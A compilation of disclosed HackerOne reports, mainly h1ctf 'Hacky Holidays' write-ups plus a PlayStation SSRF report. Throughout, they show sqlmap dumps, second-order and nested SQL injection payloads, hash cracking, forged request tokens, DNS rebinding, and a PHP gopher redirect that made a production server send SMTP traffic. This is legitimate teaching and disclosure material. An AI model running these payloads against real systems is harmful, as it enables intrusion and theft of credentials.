┌─[shubham@parrot]─[~/hackyholidays/forum]
└──╼ $
```
As I did not have any credentials, I was completely lost here so looked at tweets from hackerone and there was comment that this was created by `@adamtlangley` so I started looking at his github profile and found an interesting thing [here][14]
[14]: https://github.com/Grinch-Networks/forum                 "https://github.com/Grinch-Networks/forum"
{F1132415}
[13]: https://hackyholidays.h1ctf.com/forum              "https://hackyholidays.h1ctf.com/forum"
So I cloned it locally, whenever I get any repository first thing to check is always the history.
```
┌─[shubham@parrot]─[~/hackyholidays/forum]
└──╼ $git clone https://github.com/Grinch-Networks/forum
Cloning into 'forum'...
remote: Enumerating objects: 46, done.
remote: Counting objects: 100% (46/46), done.
remote: Compressing objects: 100% (26/26), done.
remote: Total 46 (delta 17), reused 39 (delta 13), pack-reused 0
Receiving objects: 100% (46/46), 11.55 KiB | 5.78 MiB/s, done.
Resolving deltas: 100% (17/17), done.
┌─[shubham@parrot]─[~/hackyholidays/forum]
└──╼ $cd forum
┌─[shubham@parrot]─[~/hackyholidays/forum/forum]
└──╼ $git log
commit d865b522fb91ecd286e573687ec8c7df2abd13ba (HEAD -> main, origin/main, origin/HEAD)
Author: Adam <adam@umbrella.info>
Date:   Mon Dec 7 17:15:58 2020 +0000

    Added user login and session management

commit efb92ef3f561a957caad68fca2d6f8466c4d04ae
Author: Adam <adam@umbrella.info>
Date:   Mon Dec 7 16:36:07 2020 +0000

    small fix

commit 07799dce61d7c3add39d435bdac534097de404dc
Author: Adam <adam@umbrella.info>
Date:   Mon Dec 7 16:33:32 2020 +0000

    Initial Code Commit

commit 8adaca3ae2e412b163bb44a4b6d94b0a57398d02
Author: adamtlangley <adamtlangley@gmail.com>
Date:   Mon Dec 7 14:20:49 2020 +0000

    Initial commit
┌─[shubham@parrot]─[~/hackyholidays/forum/forum]
└──╼ $
```
Found a commit with comment `small fix` so instantly checked
```
┌─[shubham@parrot]─[~/hackyholidays/forum/forum]
└──╼ $git show efb92ef3f561a957caad68fca2d6f8466c4d04ae
commit efb92ef3f561a957caad68fca2d6f8466c4d04ae
Author: Adam <adam@umbrella.info>
Date:   Mon Dec 7 16:36:07 2020 +0000

    small fix

diff --git a/models/Db.php b/models/Db.php
index 5bea1f5..1dc435c 100755
--- a/models/Db.php
+++ b/models/Db.php
 -131,7 +131,7  class Db {
      */
     static public function read(){
         if( gettype(self::$read) == 'string' ) {
-            self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
+            self::$read = new DbConnect( false, '', '','' );
         }
         return self::$read;
     }
 -146,7 +146,7 class Db {
      */
     static public function write(){
         if( gettype(self::$write) == 'string' ) {
-            self::$write = new DbConnect( true,  'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
+            self::$write = new DbConnect( true,  '', '','' );
         }
         return self::$write;
     }
┌─[shubham@parrot]─[~/hackyholidays/forum/forum]
└──╼ $
```
Database password in plain text. Recently I also got `phpmyadmin` directory and it’s administration tool for MySQL and MariaDB so used this credentials to login there.
Using `username=forum` and `password=6HgeAZ0qC9T6CQIqJpD` on  [phpmyadmin][15]
[15]:  https://hackyholidays.h1ctf.com/forum/phpmyadmin    "phpmyadmin"
{F1132423}
Got 2 hashes so searched them on [hashes.org][16]
[16]: https://hashes.org/search.php       "hashes.org"
{F1132441} 
Got the password of grinch as`BahHumbug` so logged in on [login][17] page and got the flag inside secret post.
[17]: https://hackyholidays.h1ctf.com/forum/login          "login"
{F1132444}

Challenge 9: Evil Quiz
----------------------
Description: Just how evil are you? Take the quiz and see! Just don't go poking around the admin area!
I visited [https://hackyholidays.h1ctf.com/evil-quiz][18] and got a page asking name, I entered name as `admin` and got a page asking some questions, answered them and got this page.
[18]: https://hackyholidays.h1ctf.com/evil-quiz           "https://hackyholidays.h1ctf.com/evil-quiz"
{F1132461}
It indicates that it is doing some kind query against the name I supplied, so I tried injecting it with `admin’` and got the result as 
{F1132468}
I got a result saying 0 other players. So, it is SQL injection, the score page shows the number of rows resulted from the query. However, it is the standard SQL injection, it is second order SQL injection. We inject at one page and get result of it at another page. Here I used the great tool SQLmap for it. Also I noticed the name I supply is bound to the cookie so need cookie inside request. So, I saved the request on entering name and request with score (We also need to answer the quiz in order to see score page but as with current cookie I am saving have it already answered so I am not including that request). We also need to tell sqlmap that which string in request indicates query is failed. So, we did  the following command,
```sqlmap -r first.req --second-req second.req --force-ssl --not-string="There is 0" --batch```
Used options:
`-r` : First request file
`--second-req`: Second request file
`--force-ssl`: Do request over https
`--not-string`: String to match in request when query return false
`--batch`: Never ask for user input, use the default behaviour
I got response with
```
sqlmap identified the following injection point(s) with a total of 126 HTTP(s) requests:
---
Parameter: name (POST)
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: name=admin' AND 2619=2619 AND 'gAdb'='gAdb
---
back-end DBMS: MySQL >= 8.0.0
```
So, it's time to get databases with command,
```
sqlmap -r first.req --second-req second.req --force-ssl --not-string="There is 0" --dbs --batch --dbms=mysql

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: name (POST)
	    Type: boolean-based blind
	    Title: AND boolean-based blind - WHERE or HAVING clause
            Payload: name=admin' AND 2619=2619 AND 'gAdb'='gAdb
---
back-end DBMS: MySQL >= 8.0.0
available databases [2]:
[*] information_schema
[*] quiz
```
Next step is to get tables inside database `quiz`,
```
sqlmap -r first.req --second-req second.req --force-ssl --not-string="There is 0" --no-cast --batch --dbms=mysql -D quiz --tables --time-sec 5

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: name (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: name=admin' AND 2619=2619 AND 'gAdb'='gAdb
---
back-end DBMS: MySQL >= 8.0.0
Database: quiz
[2 tables]
+-------+
| admin |
| quiz  |
+-------+
```
` --no-cast` option is used as suggested by sqlmap for good results.
So, last step is to get contents of admin table,
```
sqlmap -r first.req --second-req second.req --force-ssl --not-string="There is 0" --no-cast --batch --dbms=mysql -D quiz -T admin --dump username,password --time-sec 5

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: name (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: name=admin' AND 2619=2619 AND 'gAdb'='gAdb
---
back-end DBMS: MySQL >= 8.0.0
Database: quiz
Table: admin
[1 entry]
+----+-------------------+----------+
| id | password          | username |
+----+-------------------+----------+
| 1  | S3creT_p4ssw0rd-$ | admin    |
+----+-------------------+----------+
```
I also wrote a tamper script {F1132485} for sqlmap to perform threaded requests which is attached, thanks to [this][19] blog post.
[19]: https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/   "this"
I logged in to [admin][20] and got the flag.
[20]: https://hackyholidays.h1ctf.com/evil-quiz/admin       "admin"


Challenge 10: Signup Manager
------------------------------
Description: You've made it this far! The grinch is recruiting for his army to ruin the holidays but they're very picky on who they let in!
On browsing [https://hackyholidays.h1ctf.com/signup-manager/][21], I got a page with bunch of input fields. First thing I checked is source code of page by pressing `ctrl+U` and got a interesting comment.
[21]: https://hackyholidays.h1ctf.com/signup-manager/         "https://hackyholidays.h1ctf.com/signup-manager/"
`<!-- See README.md for assistance -->`
So I browsed [https://hackyholidays.h1ctf.com/signup-manager/README.md][22] and got the file with this contents.
[22]: https://hackyholidays.h1ctf.com/signup-manager/README.md   "https://hackyholidays.h1ctf.com/signup-manager/README.md"
```
# SignUp Manager
SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.
### How to Install
1) Create a directory that you wish SignUp Manager to be installed into
2) Move signupmanager.zip into the new directory and unzip it.
3) For security move users.txt into a directory that cannot be read from website visitors
4) Update index.php with the location of your users.txt file
5) Edit the user and admin php files to display your hidden content
6) You can make anyone an admin by changing the last character in the users.txt file to a Y
7) Default login is admin / password
```
It is telling that the file signupmanager.zip to be placed into the directory where it is being installed, so I visited [https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip][23] and got the file.
[23]: https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip     "https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip" 
There were 5 files in it `index.php, admin.php, user.php, signup.php` and `README.md`. The whole logic is is `index.php` page.
The index.php do the following things.
           1. For signup, it accepts 5 parameters username, password, age, firstname and lastname.
           2. For username, firstname and lastname it removes all special characters using regular expression and for firstname and lastname it gets first 15 characters  using substr function and it calculates md5 of password.
           3. It then checks if age is numeric or not and also if length is greater than 3.
           4. It passes all variables into addUser function.
           5. The addUser function takes all values and adds padding to all variables (15 for username, firstname and lastname and 3 for age), generates random md5, it then appends all values into one line and adds ‘N’ as end, it then calculates first 113 characters using substr function and writes it to users.txt file 
and returns random md5 as cookie.
           6. The function buildUsers reads file users.txt, converts it into object and returns the object.

From reading README.md, if ‘Y’ is at end of line, I can become admin. So, I have to somehow change the last character to ‘Y’.
Here is a small snippet that checks for a valid age.
```javascript
if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
```
It checks using `is_numeric` php function. On documentation page of this function [here][24] we see in example that it also accepts ‘e’ as a valid [number][25].  After it checks if length is greater than 3 and then uses `intval` function to calculate integer value of a variable. So if we give number “`2e3`, it will pass the `is_numeric` and `strlen` check and final value after `inval` function will be `2000`, it adds number of zeros after e. So, we can use this to become admin. I sent a request with POST data,
```
action=signup&username=random&password=random&age=2E3&firstname=random&lastname=randomlastnameY
```
[24]: https://www.php.net/manual/en/function.is-numeric.php        "here"
[25]: https://www.php.net/manual/en/language.types.float.php      "number"
For better understanding, I ran it locally and got this result.
```
┌─[shubham@parrot]─[~/hackyholidays/signupmanager]
└──╼ $cat users.txt 

random#########7ddf32e17a6ac5ce04a8ecbf782ca5091c4041d8428d6304d401d09f09117c2b2000random#########randomlastnameY
┌─[shubham@parrot]─[~/hackyholidays/signupmanager]
└──╼ $
```
So, I was successfully able to change last character of line as ‘Y’, I login using that username and password and got the flag and also link to next challenge.
{F1132510}

Challenge 11: Grinch Recon
---------------------------
This is where things started to become tricky.
I browsed [https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59][26] which I got from previous challenge and I was presented with the page
[26]: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59            "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59"
{F1132536}
Showing API is in development so I visited [https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api][27] and got information about api.
{F1132555}
So, I tried to find endpoints of API but for each request I always got response `{"error":"This endpoint cannot be visited from this IP address"}`, so we do not have access to api.(Probably a SSRF will help)
[27]: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api       "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api"
On clicking any links on home page, we get a page with url [https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k][28] with changed values of hash. I tried injecting it with `jdh34k'` but got 404 but when I injected it with `jdh34k' and 1=1 -- -` and I got page pack. BOOM!!! SQL injection.
[28]: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k    "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k"
I used sqlmap to get all information from databases but didn't get any information that can help, so dead end for me.
Whenever I get a dead end, I go one step back so I went back to page which was showing images and checked the source of page and got some interesting thing.
```javascript
<div class="col-md-4">
                        <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RiNTA3YmRiMTg2ZDMzYTcxOWViMDQ1NjAzMDIwY2VjLmpwZyIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9">
                    </div>

                    <div class="col-md-4">
                        <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9">
                    </div>

                    <div class="col-md-4">
                        <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzEzZDc0NTU0YzMwZTEwNjk3MTRhNWE5ZWRkYThjOTRkLmpwZyIsImF1dGgiOiI5NGZiMzk4ZDc4YjM2ZTdjMDc5ZTc1NjBjZTlkZjcyMSJ9">
                    </div>
 </div>
```
I base64 decoded one of the value and got test as `{"image":"r3c0n_server_4fdk59\/uploads\/13d74554c30e1069714a5a9edda8c94d.jpg","auth":"94fb398d78b36e7c079e7560ce9df721"}`
I tried accessing the page directly using [https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/uploads/13d74554c30e1069714a5a9edda8c94d.jpg][29] but got response as `Image cannot be viewed directly`.
[29]: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/uploads/13d74554c30e1069714a5a9edda8c94d.jpg "https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/uploads/13d74554c30e1069714a5a9edda8c94d.jpg"
We can only access those images through `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=` with that base64 encoded data with `image` and `auth` parameter.
So, I tried tampering with the image parameter to point it to `../api/someendpoint` but failed it `auth` key is validated for each request so I had to find a way to generate `auth` token for each request.
This is the part where I stuck for so long. Thanks to my friend `@MrKn0w1t4ll` for helping me here.
{F1132595}
From the great Inception movie, one dream inside another.
Here one SQL injection inside another SQL injection( Nested SQL injection)
[Here][30] is a great resource.
[30]: https://captnemo.in/blog/2012/06/09/nested-sql-injections/   "Here"
I already had SQL injection in `hash` parameter where we control `hash` parameter from query. 
Thanks to the author for clearing the doubts here, here is flow 
The first query is just “select * from albums where hash = x “
Something like
```
$hash = "select * from albums where hash=".$_GET['hash'].";";
```
So `$hash` is the object which contains rows returned by query which contain 3 columns `id, hash and name`.
In the data returned one of the columns id is called
Which is used for “select * from photos where album_id = id “ like
```
$images = "select * from photos where album_id=".$hash['id'].";";
```
`$images` is the object containing names of images, so server takes names of images and creates a JSON object with `image` and `auth` parameters where in image parameter it adds image name to `r3c0n_server_4fdk59\/uploads\/imagename` and generates auth token for this and converts it to base64.
So, the goal here is to control name of image to achieve the SSRF.
Here nested SQL injection comes in play. The results returned by first query where we can inject contains 3 columns id, hash and name. Here we have inject control the id which is easy to control using union query like `abc` union select 1,1,'hash' -- -` but it is not enough, we have to control the data returned by next query, thanks to object property in php, we can can inject into next query by using union injection inside id
```
abc' UNION SELECT "2' UNION SELECT 1,1,'datawecontrol' -- -",'1',1-- -
```
First we are injecting inside `hash` parameter and creating an object which is an union injection.
Using above query I got result as,
```javascript
<div class="col-md-4">
                        <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMyZmViYjE5NTcyYjEyNDM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMTZlMTc3NmJhNiJ9">
                    </div>

                
                    <div class="col-md-4">
                        <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2RhdGF3ZWNvbnRyb2wiLCJhdXRoIjoiYWNmNzRkMTMzMmIxYTk3MjRhNzUyOTFmMjU2ZTY1ZDkifQ==">
                    </div>
```
Base64 decoded 2nd value and got the thing we control
```
{"image":"r3c0n_server_4fdk59\/uploads\/datawecontrol","auth":"acf74d1332b1a9724a75291f256e65d9"}
```
And server created auth token for us to perform SSRF.
When I entered something which does not exist on website like above example, I got response as
{F1132665}
Indicating it is performing request and 404 for not found, so by this way we can enumerate valid api endpoints and also when I sent something which is valid like `../api/` page I got response as
{F1132666}
So a blind SSRF, All we have to do based on response codes as described on [api][31] page.
[31]: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api      "api"
So created a python script which is attached to do all these, thanks again to `MrKn0w1t4ll` here
{F1132643}
Got 2 valid endpoints( Filtering based on response code if 404 then invalid else valid)
Query used `abc' UNION SELECT "2' UNION SELECT 1,1,'../api/endpoint' -- -",'1',1-- -`
```
─[shubham@parrot]─[~/hackyholidays/reconserver]
└──╼ $python3 endpoint.py 
[+] Valid endpoint found: ping
[+] Valid endpoint found: user
```
Endpoint `user` seems interesting tried to find valid parameters and got 2 valid parameters.(Filtering based on response code if 400 then invalid parameter else valid parameter)
Query used `abc' UNION SELECT "2' UNION SELECT 1,1,'../api/user?parameter=abc' -- -",'1',1-- -`
```
─[shubham@parrot]─[~/hackyholidays/reconserver]
└──╼ $python3 endpoint.py 
[+] Valid parameter found: password
[+] Valid parameter found: username
```
Damn, another SQL [like][32] query injection in username and password parameters.
[32]: https://github.blog/2015-11-03-like-injection/      "like"
We can extract bit by bit by injecting `character%` and filtering results based on response codes if 204 then no data found and does not start with the specified character and if response as `invalid content type detected` then some data is found and it starts with specified character.
Using query `abc' UNION SELECT "2' UNION SELECT 1,1,'../api/user?username=character%' -- -",'1',1-- -`
So I started checking each character from python's `string.printable` string one by one and got 1st chacater at g and kept repeating like `g%, gr%, gri%`, ...
Got valid username as `grinchadmin` and did same for passwor,
Using query `abc' UNION SELECT "2' UNION SELECT 1,1,'../api/user?password=character%' -- -",'1',1-- -`
Got password as `s4ant4sucks`,  logged in on [attack-box][32] and got the flag.
[32]: https://hackyholidays.h1ctf.com/attack-box/login     "attack-box"

Challenge 12: Grinch Network Attack Server
-------------------------------------------
Using credentials from previous challenge, logged into [attack-box][32]
{F1132722}
When clicked `attack` I got the follpwing page,
{F1132727}
On viewing source code of main page, got this.
```javascript
<tr>
                        <th>Target</th>
                        <th class="text-center">Action</th>
                    </tr>
                                        <tr>
                        <td>203.0.113.33</td>
                        <td class="text-center"><a class="btn btn-danger" href="/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==" target="_blank">Attack</a></td>
                    </tr>
                                        <tr>
                        <td>203.0.113.53</td>
                        <td class="text-center"><a class="btn btn-danger" href="/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuNTMiLCJoYXNoIjoiMjgxNGY5YzczMTFhODJmMWI4MjI1ODUwMzlmNjI2MDcifQ==" target="_blank">Attack</a></td>
                    </tr>
                                        <tr>
                        <td>203.0.113.213</td>
                        <td class="text-center"><a class="btn btn-danger" href="/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMjEzIiwiaGFzaCI6IjVhYTliNWE0OTdlMzkxOGMwZTE5MDBiMmEyMjI4YzM4In0=" target="_blank">Attack</a></td>
                    </tr>
```
On decoding base64 one of the payload got `{"target":"203.0.113.213","hash":"5aa9b5a497e3918c0e1900b2a2228c38"}`
So same as previous challenge? but do not have any obvious thing that we control, so I started cracking the salt of hash( Using host computer for cracking, we should never use VM for cracking)
```
PS C:\Users\Shubham Zodape\Downloads\hashcat-6.1.1> [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMjEzIiwiaGFzaCI6IjVhYTliNWE0OTdlMzkxOGMwZTE5MDBiMmEyMjI4YzM4In0="))
{"target":"203.0.113.213","hash":"5aa9b5a497e3918c0e1900b2a2228c38"}
PS C:\Users\Shubham Zodape\Downloads\hashcat-6.1.1> echo "5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213" > ip.hash
PS C:\Users\Shubham Zodape\Downloads\hashcat-6.1.1> gc ip.hash
5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213
PS C:\Users\Shubham Zodape\Downloads\hashcat-6.1.1>.\hashcat.exe -m 10 .\ip.hash .\rockyou.txt
5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213:mrgrinch463
```
Got the salt as `mrgrinch463`, the hash is calculated by `md5(salt+ip)`.
So we can create payload for any ip, here is script I created {F1132732} to generate the payload
I created payload for ip `127.0.0.1` ( I have to take down the grinch) and sent it in `payload` parameter.
```
┌─[✗]─[shubham@parrot]─[~/hackyholidays/attackbox]
└──╼ $python3 genpayload.py 
Enter IP Address: 127.0.0.1
Raw Payload: {"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}
Encoded Payload: eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==
```
Got resposne,
{F1132737}
There is some protection for hitiing localhost so we have to bypass that protection.
Any address we give it first resolves it into an IP address then performs attack. 
There is a cool attack called [DNS-rebinding][33]
[33]: https://en.wikipedia.org/wiki/DNS_rebinding   "DNS-rebinding"
Here I used [https://github.com/taviso/rbndr][34] to perform DNS-rebinding, using `7f000001.c0a80001.rbndr.us` to create payload
[34]: https://github.com/taviso/rbndr    "https://github.com/taviso/rbndr"
```
Enter IP Address: 7f000001.c0a80001.rbndr.us
Raw Payload: {"target":"7f000001.c0a80001.rbndr.us","hash":"de9d82d4ae9a61660701e7e1844ea643"}
Encoded Payload: eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9
```
After trying out 3-4 times, finally it worked and took down Grinch and saved the holidays.
{F1132754}


Thank you hackerone for this great event, the challenges were really great. I had a lot of fun solving them and I learned many new things.

## Impact

Anyone can take down Grinch.

---

### [SSRF on image renderer](https://hackerone.com/reports/811136)

- **Report ID:** `811136`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** PlayStation
- **Reporter:** @hogarth45
- **Bounty:** 1000 usd
- **Disclosed:** 2021-01-12T01:42:20.694Z
- **CVE(s):** -

**Summary (team):**

## Summary:
image.api.np.km.playstation.net allows image urls to be passed via the `image` parameter

It is possible to use this endpoint to send Gopher requests that result in SMTP messages being sent

## Steps To Reproduce:

1. Create a Gopher redirect PHP file to save to your server

```
<?php
        $commands = array(
                'HELO test.org',
                'MAIL FROM: <aaaaaaaaaaa@tester.com>',
                'RCPT TO: <bit-bucket@test.smtp.org>',
                'DATA',
                'Test mail',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://test.smtp.org:25/_'.$payload);
?>
```

2. Point the URL to your file location via the `image` parameter

https://image.api.np.km.playstation.net/images/?format=png&image=http%3A%2F%2Fblackdoorsec.net/gopher3.php

It will return a 404 message, but you will see that your server is hit
{F737783}
{F737781}


3. Check the log  http://test.smtp.org/log

{F737782}

Confirms the ec2 instance sending the email

## Supporting Material/References:

```
GET /images/?format=png&image=http%3A%2F%2Fblackdoorsec.net/gopher3.php HTTP/1.1
Host: image.api.np.km.playstation.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

```

Related issue
https://hackerone.com/reports/115748

## Impact

craft server requests using sony servers

---

### [[h1ctf-Grinch Networks] MrR3b00t Saving the Christmas](https://hackerone.com/reports/1068934)

- **Report ID:** `1068934`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** h1-ctf
- **Reporter:** @d3f4u17
- **Bounty:** - usd
- **Disclosed:** 2021-01-11T22:36:53.487Z
- **CVE(s):** -

**Vulnerability Information:**

> Disclaimer: Certain things are a bit modified to set the pieces for the story. Also you can find the flags for all 12 challenges in file F1138300 , Now enjoy :)

```
█▀▄▀█ █▀█ ░ █▀█ █▄▄ █▀█ █▀█ ▀█▀
█░▀░█ █▀▄ ▄ █▀▄ █▄█ █▄█ █▄█ ░█░ saves the Christmas
```

**_Episode - 0x00_ Pil0t.py**

It was a gloomy clear night, Mr.R3b00t was sitting in front of the "Computer" in his  Hacker Den, sound of the keyboard clicks can be heard all around and suddenly Mr.R3b00t receives a message from none other than the mighty "h1-Team".

{F1137838}

The moment Mr.R3b00t read the message, He took an oath "Humanity has suffered a lot this year, I will not let The Grinch ruin Christmas too!, I will pawn him..(Thunder Rumbling in the background)"

**_Episode - 0x01_ r0b0ts.txt**

Mr.R3b00t pulled up his chair, put the black hoodie on (Hacker Mode initiated) and started hacking The Grinch, with such limited info and time the first thing that came into his genius mind was to do an Nmap scan on the target website, as his wise friend @ippsec once quoted, "Always perform an Nmap scan, you never know what surprise you will get" (ippsec never said that -_-).

Mr.R3b00t Performed an Nmap scan on https://hackyholidays.h1ctf.com but found nothing interesting except for one little thing!

{F1137841}

There was a robots.txt file present on the website with one disallowed entry : `/s3cr3t-ar3a` (Looks like Grinch is not good at hiding things)

To have a good look at it, Mr.R3b00t opened up the robots.txt for any additional details.

{F1137846}

The robots.txt file was leading to only one path `/s3cr3t-ar3a`, Without wasting any time Mr.R3b00t opened up the page and found the following message.

{F1137849}

Grinch was going to update the website looks like he has started off his plan, Mr.R3b00t smiled and said "This is gonna be a long Christmas..".  

**_Episode - 0x02_  .hidd3n**

Mr.R3b00t waited for a whole day and visited the `/s3cr3t-ar3a` page again, this time the page was flashing an entire new message.

{F1137850}

Soon after seeing the message, Mr.R3b00t started off with the recon to find if something is hidden in the website but **nothing interesting was found**. Clock was ticking and Mr.R3b00t was losing all hopes of saving Christmas (more like the hope of losing a private invite).

Mr.R3b00t kept thinking and searching to find a way to know what The Grinch has been hiding but nothing worked out, a ray of hope came in when Mr.R3b00t was actually able to find the true meaning of what was written on his Desktop Wallpaper.

{F1137851}

Mr.R3b00t soon contacted one of his hacker friend which was also trying to destroy Grinch's evil agenda, He told Mr.R3b00t "Not all things can be seen in the server side response, sometimes things are generated on the client's end too". It was enough for Mr.R3b00t to figure out what he was trying to say.

Mr.R3b00t quickly opened the `/s3cr3t-ar3a` and opened up the browser dev console, to search for any hidden secrets and voila.

{F1137853}

So, It was clear that The Grinch has started off his dirty games and was going to defame a list of people on his website.

**_Episode - 0x03_ id=1**

Soon after sometime, Mr.R3b00t found the list of people deployed on Grinch's website "This dirty little thing, what is he even trying to prove with this", Mr.R3b00t said.

{F1137856}

Taking a closer look Mr.R3b00t found an endpoint `/people-rater/page/1` being called on initial page load.

{F1137860}
{F1137861}

The id parameters were containing base64 strings, after decoding the first value of the id attribute, Mr.R3b00t got the following result 

{F1137888}

Rest of the decoded "id" values were having consecutive values (3,4..), Everything was looking on place except for one single thing "Where the heck is id 1 ?"

Later on, Mr.R3b00t found if you click on respective person's name a message appears for that person and a request is made to `https://hackyholidays.h1ctf.com/people-rater/entry?id={ID}` the `{ID}` was nothing but the base64 `id` values fetched earlier.

For Mr.R3b00t it was a "piece of cake" to figure out what the Grinch has been hiding here, Mr.R3b00t quickly encoded the string `{"id":1}` as base64 and sent it along with `https://hackyholidays.h1ctf.com/people-rater/entry?id={ID}`

{F1137892}

"What?? He is opening his swag shop now! What is he gonna sell? Snow Ball Launchers ?" Mr.R3b00t said.

**_Episode - 0x04_ fuZZ**

Looks like Grinch was selling some really lame stuff and of course  on his swag-shop.

{F1137893}

"Let's find out what he is hiding now", Mr.R3b00t said. 

From initial recon Mr.R3b00t found out certain API endpoint which were hidden and were not present on the site.

{F1137894}

The /api/sessions endpoint were throwing base64 encoded session strings.

{F1137895}

Mr.R3b00t quickly decoded all the strings and found out two attributes in each string "user" and "cookie", but most of the user attributes were null except for one.

{F1137899}

After spending sometime on the first endpoint it was time to move onto the second one.

An initial request to the endpoint returned the following response.

{F1137901}

Looks like the endpoint was missing some params to pass along with the request, just to be sure Mr.R3b00t also checked if any other method is allowed on the endpoint but 404 is returned, only GET was allowed on the endpoint.

It was time to enum the parameters and Mr.R3b00t had the exact tool in his arsenal that could get the work done, [Arjun](https://github.com/s0md3v/Arjun) By none other than s0md3v.

Without wasting anymore time Mr.R3b00t Fired up Arjun in his terminal and passed on the `/api/user` endpoint to look for the hidden params, just after few seconds he got the result. He found a valid parameter "uuid".

{F1137904}
{F1137905}

From the first endpoint Mr.R3b00t got a user with ID "user": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043"

At this point Mr.R3b00t exactly knew what to do next. Mr.R3b00t combined the user id with the `/user?uuid=` and BOOM!

{F1137910}

This time Mr.R3b00t has his hands on some pretty solid information about Grinch, It was Grinch's address.

"I think its time to infiltrate the fortress..", Ep04 ends.

**_Episode - 0x05_ Brut3f0rc3.py**

Being a Master in Lock Picking it was a piece of Cake for Mr.R3b00t to get into the Grinch's house. The house was a mess and full of Dog Food, and obviously no one was there.

The only thing that caught Mr.R3b00t's attention was Grinch's Computer he quickly powered up the computer but the internal web portal was password protected (Grinch is not that big of a fool as we think he is).

{F1138036}

"Hmmm, Till now he was operating from this computer", Mr.R3b00t said. Now the only way to get more info on Grinch is to hack his password.

Grinch is smart but let's see if he is smart enough to have a strong username and password. So Mr.R3b00t noticed one unusual behaviour whenever a wrong username was provided "Invalid Username" was appearing as an error, this could be the factor to bruteforce the username.

After a quick bruteforce using ffuf revealed the username as "access".

{F1138037}

Now a similar behaviour was seen with the password field, whenever Mr.R3b00t entered the username as "access" and a random password "Invalid password" error popped up.

It was time to brute force the password another quick fuzz with ffuf revealed the password as "computer".

{F1138038}

